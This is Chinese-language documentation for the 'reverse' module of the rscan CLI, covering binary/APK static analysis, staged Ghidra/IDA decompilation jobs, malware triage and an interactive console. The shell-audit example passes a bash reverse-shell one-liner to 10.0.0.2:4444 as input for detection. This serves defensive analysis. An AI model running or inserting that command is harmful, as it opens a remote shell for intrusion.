# Reverse Module

`reverse` 模块用于二进制/APK 静态分析、受管反编译作业、作业追踪和交互式逆向控制台。

## 1. 能力概览

- 静态分析：ELF/PE/APK 基础信息、加固信号、可疑导入/字符串、简单恶意特征
- 受管反编译：统一 job 生命周期（创建/运行/日志/产物/健康检查）
- 分阶段逆向：`index -> function -> full`，优先避免大样本全量反编译
- 逆向脚本生成：Ghidra/IDA/GDB 脚本与插件
- 交互控制台：函数检索、xrefs/calls、符号/段/导入、快速 GDB 命令

## 2. 推荐工作流（分阶段）

推荐顺序：

1) 先分析样本属性
- `rscan reverse analyze --input ./sample.bin --output json`

2) 建立函数索引（轻量）
- `rscan reverse decompile-run --input ./sample.bin --engine ghidra --mode index --workspace ./reverse_ws --output json`

3) 针对目标函数按需反编译
- `rscan reverse decompile-run --input ./sample.bin --engine ghidra --mode function --function main --workspace ./reverse_ws --output json`

4) 仅在需要时做全量
- `rscan reverse decompile-run --input ./sample.bin --engine ghidra --mode full --workspace ./reverse_ws --output json`

说明：

- 当使用 Ghidra 且请求 `full` 时，超大文件会自动降级为 `index`（见环境变量章节）
- 这可以显著降低大体积样本的初始处理时间和资源消耗

## 3. CLI 常用命令

### 3.1 静态分析与审计

- 生成规则模板
  - `rscan reverse rules-template --out ./reverse_rules.yaml`
- 使用自定义规则分析
  - `rscan reverse analyze --input ./sample.bin --rules-file ./reverse_rules.yaml --output json`
- 恶意样本初筛
  - `rscan reverse malware-triage --input ./sample.bin --output json`
- Shell 文本审计
  - `rscan reverse shell-audit --input ./script.sh --output json`
  - `rscan reverse shell-audit --text "bash -i >& /dev/tcp/10.0.0.2/4444 0>&1" --output json`

### 3.2 反编译计划与执行

- 生成执行计划（支持多引擎）
  - `rscan reverse decompile-plan --input ./sample.bin --engine ghidra --output json`
  - `rscan reverse decompile-plan --input ./sample.bin --engine ida --output json`
  - `rscan reverse decompile-plan --input ./sample.bin --engine objdump --output json`

- 执行受管反编译作业（推荐）
  - `rscan reverse decompile-run --input ./sample.bin --engine auto --mode index --workspace ./reverse_ws --output json`
  - `rscan reverse decompile-run --input ./sample.bin --engine ghidra --mode function --function main --workspace ./reverse_ws --output json`

- 批量执行
  - `rscan reverse decompile-batch --inputs ./a.bin --inputs ./b.bin --engine auto --mode index --workspace ./reverse_ws --parallel-jobs 4 --output json`

提示：当前受管 pseudocode 作业请优先使用 `auto|ghidra|ida`。

### 3.3 作业管理

- 列表/状态
  - `rscan reverse jobs --workspace ./reverse_ws --output json`
  - `rscan reverse job-status --job <job_id> --workspace ./reverse_ws --output json`
- 日志与产物
  - `rscan reverse job-logs --job <job_id> --workspace ./reverse_ws --stream both`
  - `rscan reverse job-artifacts --job <job_id> --workspace ./reverse_ws --output json`
- 结果查询
  - `rscan reverse job-functions --job <job_id> --workspace ./reverse_ws --output raw`
  - `rscan reverse job-show --job <job_id> --name main --workspace ./reverse_ws --output raw`
  - `rscan reverse job-search --job <job_id> --keyword crypto --workspace ./reverse_ws --output raw`
- 健康与清理
  - `rscan reverse job-doctor --job <job_id> --workspace ./reverse_ws --output json`
  - `rscan reverse job-clear --job <job_id> --workspace ./reverse_ws --output json`
  - `rscan reverse job-clear --all --workspace ./reverse_ws --output json`
  - `rscan reverse job-prune --keep 20 --workspace ./reverse_ws --output json`

### 3.4 后端和脚本生成

- 后端检测
  - `rscan reverse backend-status --output json`
- GDB/IDA/Ghidra 脚本
  - `rscan reverse gdb-plugin --out ./rscan_gdb_plugin.py`
  - `rscan reverse debug-script --input ./sample.bin --profile pwndbg --script-out ./debug.gdb`
  - `rscan reverse ida-script --out ./ida_export_pseudocode.py`
  - `rscan reverse ghidra-script --out ./ghidra_export_pseudocode.java`
  - `rscan reverse ghidra-index-script --out ./ghidra_export_index.java`
  - `rscan reverse ghidra-function-script --out ./ghidra_export_function.java`

## 4. 交互控制台

启动：

- `rscan reverse console --input ./sample.bin --workspace ./reverse_ws`

控制台内推荐：

1) `decompile` 默认走 `index`（轻量）
2) 用 `functions/search/show` 定位目标
3) 需要函数体时执行 `function` 模式
4) 仅在必要时使用 `full`

核心命令：

- `decompile|run <auto|ghidra|ida|r2|jadx> [workspace] [timeout_secs] [index|full|function] [name_or_ea]`
- `pseudocode <auto|ghidra|ida> [out_dir] [index|full|function] [name_or_ea]`
- `jobs`
- `functions [job_id] [limit]`
- `show <function_name_or_ea> [job_id]`
- `search <keyword> [job_id]`
- `calls <function_name_or_ea> [job_id] [json]`
- `xrefs <function_name_or_ea> [job_id] [json]`

辅助命令：

- `sections [json]` / `imports [json]` / `symbols [pattern] [limit] [json]`
- `hexdump <offset_hex_or_dec> [len]`
- `strings [pattern] [limit]`
- `job-doctor [job_id]`
- `prune-jobs [keep_count|keep=N] [days=N] [running]`

## 5. 大文件优化（Ghidra）

环境变量：

- `RSCAN_GHIDRA_AUTO_INDEX_MB=50`
  - 把自动降级阈值设为 50MB
- `RSCAN_GHIDRA_AUTO_INDEX_MB=0`
  - 关闭自动降级

默认行为：

- 未设置时阈值为 `25MB`
- 当 `--mode full` 且样本超过阈值时，自动切到 `index`
- job 元数据里的 `mode`/`note` 会记录实际生效模式与切换原因

## 6. 产物目录结构

以 `--workspace ./reverse_ws` 为例：

- `reverse_ws/jobs/<job_id>/meta.json`
- `reverse_ws/jobs/<job_id>/stdout.log`
- `reverse_ws/jobs/<job_id>/stderr.log`
- `reverse_ws/reverse_out/<job_id>/index.jsonl | function.jsonl | pseudocode.jsonl`

## 7. 常见问题

- Q: 为什么作业成功但 `full` 结果没有生成全量 pseudocode？
- A: 可能命中大文件自动降级，查看 `job-status` 返回里的 `mode` 与 `note`。

- Q: 怎么快速看某个函数？
- A: 先 `mode index` 建索引，再 `mode function --function <name_or_ea>`。

- Q: 控制台太慢怎么办？
- A: 避免直接 `full`，优先 `index` + `function`。
